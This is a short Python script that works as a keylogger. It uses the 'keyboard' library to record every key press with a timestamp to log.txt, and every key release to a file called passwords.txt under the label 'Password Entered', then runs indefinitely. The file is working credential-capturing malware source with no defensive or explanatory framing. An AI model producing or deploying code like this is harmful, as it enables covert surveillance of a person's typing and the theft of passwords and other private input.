import keyboard
import os
import datetime

log_file = "log.txt"
password_file = "passwords.txt"

def on_key_press(event):
    with open(log_file, "a") as f:
        f.write(f"[{datetime.datetime.now()}] Key Pressed: {event.name}\n")
        
keyboard.on_press(on_key_press)

def on_password_input(event):
    with open(password_file, "a") as f:
        f.write(f"[{datetime.datetime.now()}] Password Entered: {event.name}\n")
        
keyboard.on_release(on_password_input)

keyboard.wait()